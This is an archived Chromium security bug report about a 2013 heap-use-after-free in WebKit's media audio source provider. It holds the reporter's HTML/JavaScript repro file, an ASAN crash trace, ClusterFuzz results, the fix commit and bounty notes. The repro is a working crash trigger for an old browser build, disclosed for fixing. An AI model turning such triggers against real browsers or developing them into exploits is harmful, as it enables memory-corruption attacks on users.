# Heap-use-after-free in WebKit::WebMediaPlayerClientImpl::AudioSourceProviderImpl::setClient

| Field | Value |
|-------|-------|
| **Issue ID** | [40076783](https://issues.chromium.org/issues/40076783) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Reporter** | at...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2013-01-08 |
| **Bounty** | $1,000.00 |

## Description


Tested on:

OS: Ubuntu 12.04
Chromium: ASAN 26.0.1377.0 (Developer Build 175484) 


Repro-file:

<html>
<body>
<script>
(function() {
window.audio = new Audio();
audio.src = 'data:audio/wav;base64,T2dnUwACAAAAAAAAAACpbiJSAAAAAGuP+6ABHgF2b3JiaXMAAAAABoC7AAAAAAAAQH4FAAAAAAC4AU9nZ1MAAAAAAAAAAAAAqW4iUgEAAAB6KHaSDUr//////////////8kDdm9yYmlzHQAAAFhpcGguT3JnIGxpYlZvcmJpcyBJIDIwMDkwNjI0AQAAABkAAABFTkNPREVSPWVuY29kZXJfZXhhbXBsZS5jAQV2b3JiaXMfQkNWAQAAAQAYY1QpRplS0kqJGXOUMUaZYpJKiaWEFkJInXMUU6k515xrrLm1IIQQGlNQKQWZUo5SaRljkCkFmVIQS0kldBI6J51jEFtJwdaYa4tBthyEDZpSTCnElFKKQggZU4wpxZRSSkIHJXQOOuYcU45KKEG4nHOrtZaWY4updJJK5yRkTEJIKYWSSgelU05CSDWW1lIpHXNSUmpB6CCEEEK2IIQNgtCQVQAAAQDAQBAasgoAUAAAEIqhGIoChIasAgAyAAAEoCiO4iiOIzmSY0kWEBqyCgAAAgAQAADAcBRJkRTJsSRL0ixL00RRVX3VNlVV9nVd13Vd13UgNGQVAAABAEBIp5mlGiDCDGQYCA1ZBQAgAAAARijCEANCQ1YBAAABAABiKDmIJrTmfHOOg2Y5aCrF5nRwItXmSW4q5uacc845J5tzxjjnnHOKcmYxaCa05pxzEoNmKWgmtOacc57E5kFrqrTmnHPGOaeDcUYY55xzmrTmQWo21uaccxa0pjlqLsXmnHMi5eZJbS7V5pxzzjnnnHPOOeecc6oXp3NwTjjnnHOi9uZabkIX55xzPhmne3NCOOecc84555xzzjnnnHOC0JBVAAAQAABBGDaGcacgSJ+jgRhFiGnIpAfdo8MkaAxyCqlHo6ORUuo';
function onLoad(e) {
  var source = new webkitAudioContext().createMediaElementSource(audio);
}
window.addEventListener('load', onLoad, false);
})();
</script>
</body>
</html>

ASAN-report:

==27817== ERROR: AddressSanitizer: heap-use-after-free on address 0x7fcc91f74240 at pc 0x7fcca49a67d2 bp 0x7fffbed738a0 sp 0x7fffbed73898
READ of size 8 at 0x7fcc91f74240 thread T0 (chrome)
    #0 0x7fcca49a67d1 in WebKit::WebMediaPlayerClientImpl::AudioSourceProviderImpl::setClient(WebCore::AudioSourceProviderClient*) ???:0
    #1 0x7fcca71530f6 in WebCore::AudioContext::createMediaElementSource(WebCore::HTMLMediaElement*, int&) ???:0
    #2 0x7fcca815bae1 in WebCore::AudioContextV8Internal::createMediaElementSourceCallback(v8::Arguments const&) gen/webkit/bindings/V8DerivedSources05.cpp:0
    #3 0x7fcca9c43009 in v8::internal::Builtin_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate*) ../../v8/src/builtins.cc:0
    #4 0x48f42f0654d in
    #5 0x48f42f44361 in
.
.
.
freed by thread T4 (MediaPipeline) here:
    #0 0x7fcca30b8682 in operator delete(void*) ??:0
    #1 0x7fccaa5b212e in media::AudioRendererImpl::~AudioRendererImpl() ???:0
    #2 0x7fccaa5b1cdd in media::AudioRendererImpl::~AudioRendererImpl() ???:0
    #3 0x7fccaa5765d1 in media::FilterCollection::~FilterCollection() ???:0
    #4 0x7fccaa58d91a in media::Pipeline::OnStopCompleted(media::PipelineStatus) ???:0
    #5 0x7fccaa59869b in media::SerialRunner::RunNextInSeries(media::PipelineStatus) ???:0
    #6 0x7fcca4d0330f in base::internal::Invoker<1, base::internal::BindState<base::Callback<void (media::PipelineStatus)>, void (media::PipelineStatus), void (media::PipelineStatus)>, void (media::PipelineStatus)>::Run(base::internal::BindStateBase*) ???:0
.
.
.


## Timeline

### at...@gmail.com (2013-01-08)

Sorry slipped on a wrong Issue-type.

### in...@chromium.org (2013-01-08)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-01-08)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=158656492

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f1328e3d880
Crash State:
  - crash stack -
  WebKit::WebMediaPlayerClientImpl::AudioSourceProviderImpl::setClient
  WebCore::AudioContext::createMediaElementSource
  - free stack -
  media::AudioRendererImpl::~AudioRendererImpl
  media::AudioRendererImpl::~AudioRendererImpl
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=174804:174839

Minimized Testcase (1.12 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96F0zrFj0RoD1wlIkqphk__yKjTYNf-drvTYjiCI32hwILeAMh809-tQHVxBUCcrsKxGMxbDmY1g9DsBKYDtdG5xl0Afc9GEI2bnEe1qb_2ZVNoCaINnQCUyDYuGfapENwgUsdON225G3KvEqcscrZEU3l6AbzCimwgdHy1reY8vRG1Ozg

### in...@chromium.org (2013-01-08)

Looks like regression from http://src.chromium.org/viewvc/chrome?view=rev&revision=174808

### sc...@chromium.org (2013-01-08)

taking a look

### sc...@chromium.org (2013-01-08)

gaaaahhhh https://codereview.chromium.org/11779045/

### in...@chromium.org (2013-01-08)

yay! superb turnaround patch time Andrew.

### sc...@chromium.org (2013-01-08)

yeah this is (sadly) a repeat of https://crbug.com/chromium/132890

I filed https://crbug.com/chromium/136442 to document how we need to get the ownership / lifetime cleaned up but it got no traction

I might go ahead and fix it myself after landing the fix...

### bu...@chromium.org (2013-01-09)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=175765

------------------------------------------------------------------------
r175765 | scherkus@chromium.org | 2013-01-09T10:20:01.206010Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/webkit/media/webmediaplayer_impl.h?r1=175765&r2=175764&pathrev=175765
   M http://src.chromium.org/viewvc/chrome/trunk/src/webkit/media/webmediaplayer_impl.cc?r1=175765&r2=175764&pathrev=175765

Have WebMediaPlayerImpl maintain a reference to AudioRendererSink.

BUG=168768


Review URL: https://chromiumcodereview.appspot.com/11779045
------------------------------------------------------------------------

### in...@chromium.org (2013-01-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-01-10)

ClusterFuzz has detected this issue as fixed in range 175744:175779.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=158656492

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f1328e3d880
Crash State:
  - crash stack -
  WebKit::WebMediaPlayerClientImpl::AudioSourceProviderImpl::setClient
  WebCore::AudioContext::createMediaElementSource
  - free stack -
  media::AudioRendererImpl::~AudioRendererImpl
  media::AudioRendererImpl::~AudioRendererImpl
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=174804:174839
Fixed: https://cluster-fuzz.appspot.com/revisions?range=175744:175779

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96F0zrFj0RoD1wlIkqphk__yKjTYNf-drvTYjiCI32hwILeAMh809-tQHVxBUCcrsKxGMxbDmY1g9DsBKYDtdG5xl0Afc9GEI2bnEe1qb_2ZVNoCaINnQCUyDYuGfapENwgUsdON225G3KvEqcscrZEU3l6AbzCimwgdHy1reY8vRG1Ozg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2013-01-11)

This is a trunk regression on M26, I don't think it needs Merge-Approved?

### sc...@chromium.org (2013-01-11)

Correct -- it's purely a M26 trunk regression

### sc...@gmail.com (2013-01-22)

@attekett: thanks for catching the regression, $1000!

### pa...@chromium.org (2013-02-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-02-21)

Paid as part of $6000 batch.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/168768?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/168916]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076783)*
